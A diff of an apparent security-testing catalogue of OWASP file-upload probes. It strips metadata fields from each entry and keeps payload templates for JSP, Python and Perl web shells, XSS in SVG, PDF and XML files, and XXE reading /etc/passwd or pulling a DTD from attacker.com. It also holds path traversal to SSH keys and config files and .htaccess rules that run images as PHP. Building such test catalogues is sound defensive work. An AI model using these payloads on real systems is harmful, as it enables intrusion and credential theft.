     "template": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
-    "description": "JSP One-liner probe from OWASP. Tests application handling of: <%Runtime.getRuntime().exec(re...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP One-liner probe from OWASP. Tests application handling of: <%Runtime.getRuntime().exec(re..."
   },
   {
     "id": "file-upload-owasp-0159",
     "name": "Python Web Shell",
     "template": "#!/usr/bin/env python",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: #!/usr/bin/env python",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: #!/usr/bin/env python"
   },
   {
     "id": "file-upload-owasp-0160",
     "name": "Python Web Shell #2",
     "template": "import os",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: import os",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: import os"
   },
   {
     "id": "file-upload-owasp-0161",
     "name": "Python Web Shell #3",
     "template": "import cgi",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: import cgi",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: import cgi"
   },
   {
     "id": "file-upload-owasp-0162",
     "name": "Python Web Shell #4",
     "template": "form = cgi.FieldStorage()",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: form = cgi.FieldStorage()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: form = cgi.FieldStorage()"
   },
   {
     "id": "file-upload-owasp-0163",
     "name": "Python Web Shell #5",
     "template": "cmd = form.getvalue('cmd')",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: cmd = form.getvalue('cmd')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: cmd = form.getvalue('cmd')"
   },
   {
     "id": "file-upload-owasp-0164",
     "name": "Python Web Shell #6",
     "template": "os.system(cmd)",
-    "description": "Python Web Shell probe from OWASP. Tests application handling of: os.system(cmd)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Python Web Shell probe from OWASP. Tests application handling of: os.system(cmd)"
   },
   {
     "id": "file-upload-owasp-0165",
     "name": "Perl Web Shell",
     "template": "#!/usr/bin/perl",
-    "description": "Perl Web Shell probe from OWASP. Tests application handling of: #!/usr/bin/perl",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Perl Web Shell probe from OWASP. Tests application handling of: #!/usr/bin/perl"
   },
   {
     "id": "file-upload-owasp-0166",
     "name": "Perl Web Shell #2",
     "template": "use CGI;",
-    "description": "Perl Web Shell probe from OWASP. Tests application handling of: use CGI;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Perl Web Shell probe from OWASP. Tests application handling of: use CGI;"
   },
   {
     "id": "file-upload-owasp-0167",
     "name": "Perl Web Shell #3",
     "template": "$q = CGI->new;",
-    "description": "Perl Web Shell probe from OWASP. Tests application handling of: $q = CGI->new;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Perl Web Shell probe from OWASP. Tests application handling of: $q = CGI->new;"
   },
   {
     "id": "file-upload-owasp-0168",
     "name": "Perl Web Shell #4",
     "template": "print $q->header;",
-    "description": "Perl Web Shell probe from OWASP. Tests application handling of: print $q->header;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Perl Web Shell probe from OWASP. Tests application handling of: print $q->header;"
   },
   {
     "id": "file-upload-owasp-0169",
     "name": "Perl Web Shell #5",
     "template": "print `$q->param('cmd')`;",
-    "description": "Perl Web Shell probe from OWASP. Tests application handling of: print `$q->param('cmd')`;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Perl Web Shell probe from OWASP. Tests application handling of: print `$q->param('cmd')`;"
   },
   {
     "id": "file-upload-owasp-0170",
     "name": "HTML File Upload",
     "template": "<html>",
-    "description": "HTML File Upload probe from OWASP. Tests application handling of: <html>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "HTML File Upload probe from OWASP. Tests application handling of: <html>"
   },
   {
     "id": "file-upload-owasp-0171",
     "name": "HTML File Upload #2",
     "template": "<body>",
-    "description": "HTML File Upload probe from OWASP. Tests application handling of: <body>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "HTML File Upload probe from OWASP. Tests application handling of: <body>"
   },
   {
     "id": "file-upload-owasp-0172",
     "name": "HTML File Upload #3",
     "template": "<script>alert(document.cookie)</script>",
-    "description": "HTML File Upload probe from OWASP. Tests application handling of: <script>alert(document.cookie)...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "HTML File Upload probe from OWASP. Tests application handling of: <script>alert(document.cookie)..."
   },
   {
     "id": "file-upload-owasp-0173",
     "name": "HTML File Upload #4",
     "template": "</body>",
-    "description": "HTML File Upload probe from OWASP. Tests application handling of: </body>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "HTML File Upload probe from OWASP. Tests application handling of: </body>"
   },
   {
     "id": "file-upload-owasp-0174",
     "name": "HTML File Upload #5",
     "template": "</html>",
-    "description": "HTML File Upload probe from OWASP. Tests application handling of: </html>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "HTML File Upload probe from OWASP. Tests application handling of: </html>"
   },
   {
     "id": "file-upload-owasp-0175",
     "name": "SVG File Upload with XSS",
     "template": "<?xml version=\"1.0\" standalone=\"no\"?>",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <?xml version=\"1.0\" standalone...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <?xml version=\"1.0\" standalone..."
   },
   {
     "id": "file-upload-owasp-0176",
     "name": "SVG File Upload with XSS #2",
     "template": "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <!DOCTYPE svg PUBLIC \"-//W3C//...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <!DOCTYPE svg PUBLIC \"-//W3C//..."
   },
   {
     "id": "file-upload-owasp-0177",
     "name": "SVG File Upload with XSS #3",
     "template": "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <svg version=\"1.1\" baseProfile...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <svg version=\"1.1\" baseProfile..."
   },
   {
     "id": "file-upload-owasp-0178",
     "name": "SVG File Upload with XSS #4",
     "template": "<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <polygon id=\"triangle\" points=...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <polygon id=\"triangle\" points=..."
   },
   {
     "id": "file-upload-owasp-0179",
     "name": "SVG File Upload with XSS #5",
     "template": "<script type=\"text/javascript\">",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <script type=\"text/javascript\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: <script type=\"text/javascript\"..."
   },
   {
     "id": "file-upload-owasp-0180",
     "name": "SVG File Upload with XSS #6",
     "template": "alert(document.domain);",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: alert(document.domain);",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: alert(document.domain);"
   },
   {
     "id": "file-upload-owasp-0181",
     "name": "SVG File Upload with XSS #7",
     "template": "</svg>",
-    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: </svg>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG File Upload with XSS probe from OWASP. Tests application handling of: </svg>"
   },
   {
     "id": "file-upload-owasp-0182",
     "name": "SVG with XSS (onload)",
     "template": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">",
-    "description": "SVG with XSS (onload) probe from OWASP. Tests application handling of: <svg xmlns=\"http://www.w3.org/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG with XSS (onload) probe from OWASP. Tests application handling of: <svg xmlns=\"http://www.w3.org/..."
   },
   {
     "id": "file-upload-owasp-0183",
     "name": "PDF with XSS (if rendered in browser)",
     "template": "1 0 obj",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: 1 0 obj",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: 1 0 obj"
   },
   {
     "id": "file-upload-owasp-0184",
     "name": "PDF with XSS (if rendered in browser) #2",
     "template": "<<",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: <<",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: <<"
   },
   {
     "id": "file-upload-owasp-0185",
     "name": "PDF with XSS (if rendered in browser) #3",
     "template": "/Type /Catalog",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Type /Catalog",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Type /Catalog"
   },
   {
     "id": "file-upload-owasp-0186",
     "name": "PDF with XSS (if rendered in browser) #4",
     "template": "/Outlines 2 0 R",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Outlines 2 0 R",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Outlines 2 0 R"
   },
   {
     "id": "file-upload-owasp-0187",
     "name": "PDF with XSS (if rendered in browser) #5",
     "template": "/Pages 3 0 R",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Pages 3 0 R",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /Pages 3 0 R"
   },
   {
     "id": "file-upload-owasp-0188",
     "name": "PDF with XSS (if rendered in browser) #6",
     "template": "/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /OpenAction << /S /JavaScript ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: /OpenAction << /S /JavaScript ..."
   },
   {
     "id": "file-upload-owasp-0189",
     "name": "PDF with XSS (if rendered in browser) #7",
     "template": ">>",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: >>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: >>"
   },
   {
     "id": "file-upload-owasp-0190",
     "name": "PDF with XSS (if rendered in browser) #8",
     "template": "endobj",
-    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: endobj",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF with XSS (if rendered in browser) probe from OWASP. Tests application handling of: endobj"
   },
   {
     "id": "file-upload-owasp-0191",
     "name": "XML with XSS",
     "template": "<?xml version=\"1.0\"?>",
-    "description": "XML with XSS probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XSS probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?>"
   },
   {
     "id": "file-upload-owasp-0192",
     "name": "XML with XSS #2",
     "template": "<!DOCTYPE html [",
-    "description": "XML with XSS probe from OWASP. Tests application handling of: <!DOCTYPE html [",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XSS probe from OWASP. Tests application handling of: <!DOCTYPE html ["
   },
   {
     "id": "file-upload-owasp-0193",
     "name": "XML with XSS #3",
     "template": "<!ENTITY js \"alert(document.domain)\">",
-    "description": "XML with XSS probe from OWASP. Tests application handling of: <!ENTITY js \"alert(document.do...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XSS probe from OWASP. Tests application handling of: <!ENTITY js \"alert(document.do..."
   },
   {
     "id": "file-upload-owasp-0194",
     "name": "XML with XSS #4",
     "template": "]>",
-    "description": "XML with XSS probe from OWASP. Tests application handling of: ]>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XSS probe from OWASP. Tests application handling of: ]>"
   },
   {
     "id": "file-upload-owasp-0195",
     "name": "XML with XSS #5",
     "template": "<script>&js;</script>",
-    "description": "XML with XSS probe from OWASP. Tests application handling of: <script>&js;</script>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XSS probe from OWASP. Tests application handling of: <script>&js;</script>"
   },
   {
     "id": "file-upload-owasp-0196",
     "name": "SVG with XXE",
     "template": "<?xml version=\"1.0\" standalone=\"yes\"?>",
-    "description": "SVG with XXE probe from OWASP. Tests application handling of: <?xml version=\"1.0\" standalone...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG with XXE probe from OWASP. Tests application handling of: <?xml version=\"1.0\" standalone..."
   },
   {
     "id": "file-upload-owasp-0197",
     "name": "SVG with XXE #2",
     "template": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>",
-    "description": "SVG with XXE probe from OWASP. Tests application handling of: <!DOCTYPE test [ <!ENTITY xxe ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG with XXE probe from OWASP. Tests application handling of: <!DOCTYPE test [ <!ENTITY xxe ..."
   },
   {
     "id": "file-upload-owasp-0198",
     "name": "SVG with XXE #3",
     "template": "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
-    "description": "SVG with XXE probe from OWASP. Tests application handling of: <svg width=\"128px\" height=\"128...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG with XXE probe from OWASP. Tests application handling of: <svg width=\"128px\" height=\"128..."
   },
   {
     "id": "file-upload-owasp-0199",
     "name": "SVG with XXE #4",
     "template": "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
-    "description": "SVG with XXE probe from OWASP. Tests application handling of: <text font-size=\"16\" x=\"0\" y=\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "SVG with XXE probe from OWASP. Tests application handling of: <text font-size=\"16\" x=\"0\" y=\"..."
   },
   {
     "id": "file-upload-owasp-0200",
     "name": "XML with XXE",
     "template": "<!DOCTYPE foo [",
-    "description": "XML with XXE probe from OWASP. Tests application handling of: <!DOCTYPE foo [",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XXE probe from OWASP. Tests application handling of: <!DOCTYPE foo ["
   },
   {
     "id": "file-upload-owasp-0201",
     "name": "XML with XXE #2",
     "template": "<!ELEMENT foo ANY >",
-    "description": "XML with XXE probe from OWASP. Tests application handling of: <!ELEMENT foo ANY >",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XXE probe from OWASP. Tests application handling of: <!ELEMENT foo ANY >"
   },
   {
     "id": "file-upload-owasp-0202",
     "name": "XML with XXE #3",
     "template": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>",
-    "description": "XML with XXE probe from OWASP. Tests application handling of: <!ENTITY xxe SYSTEM \"file:///e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XXE probe from OWASP. Tests application handling of: <!ENTITY xxe SYSTEM \"file:///e..."
   },
   {
     "id": "file-upload-owasp-0203",
     "name": "XML with XXE #4",
     "template": "<foo>&xxe;</foo>",
-    "description": "XML with XXE probe from OWASP. Tests application handling of: <foo>&xxe;</foo>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XML with XXE probe from OWASP. Tests application handling of: <foo>&xxe;</foo>"
   },
   {
     "id": "file-upload-owasp-0204",
     "name": "XXE - Parameter Entity",
     "template": "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
-    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: <!ENTITY % xxe SYSTEM \"http://...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: <!ENTITY % xxe SYSTEM \"http://..."
   },
   {
     "id": "file-upload-owasp-0205",
     "name": "XXE - Parameter Entity #2",
     "template": "%xxe;",
-    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: %xxe;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: %xxe;"
   },
   {
     "id": "file-upload-owasp-0206",
     "name": "XXE - Parameter Entity #3",
     "template": "<foo>&exfil;</foo>",
-    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: <foo>&exfil;</foo>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Parameter Entity probe from OWASP. Tests application handling of: <foo>&exfil;</foo>"
   },
   {
     "id": "file-upload-owasp-0207",
     "name": "XXE - Blind OOB",
     "template": "<?xml version=\"1.0\" ?>",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <?xml version=\"1.0\" ?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <?xml version=\"1.0\" ?>"
   },
   {
     "id": "file-upload-owasp-0208",
     "name": "XXE - Blind OOB #2",
     "template": "<!DOCTYPE r [",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!DOCTYPE r [",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!DOCTYPE r ["
   },
   {
     "id": "file-upload-owasp-0209",
     "name": "XXE - Blind OOB #3",
     "template": "<!ELEMENT r ANY >",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!ELEMENT r ANY >",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!ELEMENT r ANY >"
   },
   {
     "id": "file-upload-owasp-0210",
     "name": "XXE - Blind OOB #4",
     "template": "<!ENTITY % sp SYSTEM \"http://attacker.com/xxe.dtd\">",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!ENTITY % sp SYSTEM \"http://a...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <!ENTITY % sp SYSTEM \"http://a..."
   },
   {
     "id": "file-upload-owasp-0211",
     "name": "XXE - Blind OOB #5",
     "template": "%sp;",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: %sp;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: %sp;"
   },
   {
     "id": "file-upload-owasp-0212",
     "name": "XXE - Blind OOB #6",
     "template": "%param1;",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: %param1;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: %param1;"
   },
   {
     "id": "file-upload-owasp-0213",
     "name": "XXE - Blind OOB #7",
     "template": "<r>&exfil;</r>",
-    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <r>&exfil;</r>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "XXE - Blind OOB probe from OWASP. Tests application handling of: <r>&exfil;</r>"
   },
   {
     "id": "file-upload-owasp-0214",
     "name": "Directory Traversal",
     "template": "../../../etc/passwd",
-    "description": "Directory Traversal probe from OWASP. Tests application handling of: ../../../etc/passwd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Directory Traversal probe from OWASP. Tests application handling of: ../../../etc/passwd"
   },
   {
     "id": "file-upload-owasp-0215",
     "name": "Directory Traversal #2",
     "template": "..\\..\\..\\..\\windows\\system32\\config\\sam",
-    "description": "Directory Traversal probe from OWASP. Tests application handling of: ..\\..\\..\\..\\windows\\system32\\c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Directory Traversal probe from OWASP. Tests application handling of: ..\\..\\..\\..\\windows\\system32\\c..."
   },
   {
     "id": "file-upload-owasp-0216",
     "name": "Directory Traversal #3",
     "template": "....//....//....//etc/passwd",
-    "description": "Directory Traversal probe from OWASP. Tests application handling of: ....//....//....//etc/passwd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Directory Traversal probe from OWASP. Tests application handling of: ....//....//....//etc/passwd"
   },
   {
     "id": "file-upload-owasp-0217",
     "name": "Overwrite Important Files",
     "template": "../../../var/www/html/index.php",
-    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../var/www/html/index.ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../var/www/html/index.ph..."
   },
   {
     "id": "file-upload-owasp-0218",
     "name": "Overwrite Important Files #2",
     "template": "../../../.ssh/authorized_keys",
-    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../.ssh/authorized_keys",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../.ssh/authorized_keys"
   },
   {
     "id": "file-upload-owasp-0219",
     "name": "Overwrite Important Files #3",
     "template": "../../config.php",
-    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../config.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../config.php"
   },
   {
     "id": "file-upload-owasp-0220",
     "name": "Overwrite Important Files #4",
     "template": "../../../.htaccess",
-    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../.htaccess",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../../.htaccess"
   },
   {
     "id": "file-upload-owasp-0221",
     "name": "Overwrite Important Files #5",
     "template": "../../wp-config.php",
-    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../wp-config.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Overwrite Important Files probe from OWASP. Tests application handling of: ../../wp-config.php"
   },
   {
     "id": "file-upload-owasp-0222",
     "name": "Filename with Path Traversal",
     "template": "../../../../tmp/shell.php",
-    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ../../../../tmp/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ../../../../tmp/shell.php"
   },
   {
     "id": "file-upload-owasp-0223",
     "name": "Filename with Path Traversal #2",
     "template": "..%2f..%2f..%2fetc%2fpasswd",
-    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ..%2f..%2f..%2fetc%2fpasswd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ..%2f..%2f..%2fetc%2fpasswd"
   },
   {
     "id": "file-upload-owasp-0224",
     "name": "Filename with Path Traversal #3",
     "template": "..%252f..%252f..%252fetc%252fpasswd",
-    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ..%252f..%252f..%252fetc%252fp...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Filename with Path Traversal probe from OWASP. Tests application handling of: ..%252f..%252f..%252fetc%252fp..."
   },
   {
     "id": "file-upload-owasp-0225",
     "name": ".htaccess to Execute PHP",
     "template": "AddType application/x-httpd-php .jpg",
-    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph..."
   },
   {
     "id": "file-upload-owasp-0226",
     "name": ".htaccess to Execute PHP #2",
     "template": "AddType application/x-httpd-php .png",
-    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph..."
   },
   {
     "id": "file-upload-owasp-0227",
     "name": ".htaccess to Execute PHP #3",
     "template": "AddType application/x-httpd-php .gif",
-    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Execute PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph..."
   },
   {
     "id": "file-upload-owasp-0228",
     "name": ".htaccess to Execute All Files as PHP",
     "template": "AddType application/x-httpd-php .",
-    "description": ".htaccess to Execute All Files as PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Execute All Files as PHP probe from OWASP. Tests application handling of: AddType application/x-httpd-ph..."
   },
   {
     "id": "file-upload-owasp-0229",
     "name": ".htaccess to Execute All Files as PHP #2",
     "template": "SetHandler application/x-httpd-php",
-    "description": ".htaccess to Execute All Files as PHP probe from OWASP. Tests application handling of: SetHandler application/x-httpd...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Execute All Files as PHP probe from OWASP. Tests application handling of: SetHandler application/x-httpd..."
   },
   {
     "id": "file-upload-owasp-0230",
     "name": ".htaccess to Bypass Upload Restrictions",
     "template": "<FilesMatch \"\\.ph(p|tml)\">",
-    "description": ".htaccess to Bypass Upload Restrictions probe from OWASP. Tests application handling of: <FilesMatch \"\\.ph(p|tml)\">",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Bypass Upload Restrictions probe from OWASP. Tests application handling of: <FilesMatch \"\\.ph(p|tml)\">"
   },
   {
     "id": "file-upload-owasp-0231",
     "name": ".htaccess to Bypass Upload Restrictions #2",
